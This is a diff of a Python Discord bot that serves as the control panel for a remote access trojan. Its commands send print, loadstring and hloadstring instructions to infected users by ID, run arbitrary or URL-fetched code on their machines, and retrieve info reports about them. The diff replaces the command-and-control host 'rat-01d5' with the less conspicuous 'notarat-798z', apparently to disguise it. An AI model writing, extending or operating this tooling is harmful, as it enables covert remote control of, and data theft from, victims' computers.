@@ -56,7 +56,7 @@ class MyClient(discord.Client):
         while True:
             try:
                 category = discord.utils.get(guild.categories, name="users")
-                response = requests.get("https://rat-01d5.onrender.com/active")
+                response = requests.get("https://notarat-798z.onrender.com/active")
                 if response.status_code == 200:
                     new_active_users = set(response.json())
                     added = new_active_users - self.active_users
@@ -103,7 +103,7 @@ async def print_command(interaction: discord.Interaction, arg: str):
     payload = {"to": uid, "command": "print", "args": arg}
 
     try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
+        res = requests.post("https://notarat-798z.onrender.com/send", json=payload)
         if res.status_code == 200:
             await interaction.response.send_message(f"ran `{uid}`.")
         else:
@@ -132,7 +132,7 @@ async def loadstring_command(interaction: discord.Interaction, code: str):
     payload = {"to": uid, "command": "loadstring", "args": code}
 
     try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
+        res = requests.post("https://notarat-798z.onrender.com/send", json=payload)
         if res.status_code == 200:
             await interaction.response.send_message("ran loadstring", ephemeral=False)
         else:
@@ -161,7 +161,7 @@ async def hloadstring_command(interaction: discord.Interaction, url: str):
     payload = {"to": uid, "command": "hloadstring", "args": url}
 
     try:
-        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
+        res = requests.post("https://notarat-798z.onrender.com/send", json=payload)
         if res.status_code == 200:
             await interaction.response.send_message("sent hloadstring", ephemeral=False)
         else:
@@ -195,7 +195,7 @@ async def info_command(interaction: discord.Interaction):
 
     import aiohttp
     async with aiohttp.ClientSession() as session:
-        async with session.get(f"https://rat-01d5.onrender.com/info_report/{userid}") as resp:
+        async with session.get(f"https://notarat-798z.onrender.com/info_report/{userid}") as resp:
             if resp.status != 200:
                 await interaction.followup.send("no info twin", ephemeral=True)
                 return
@@ -262,7 +262,7 @@ async def clear_active_command(interaction: discord.Interaction, confirm: str = 
     async def run_clear():
         await interaction.response.defer(ephemeral=False)
         try:
-            res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
+            res = requests.post("https://notarat-798z.onrender.com/clear_active", json={"key": DEL_KEY})
             if res.status_code == 200:
                 guild = discord.utils.get(client.guilds, id=1392242413740883968)
                 if guild:
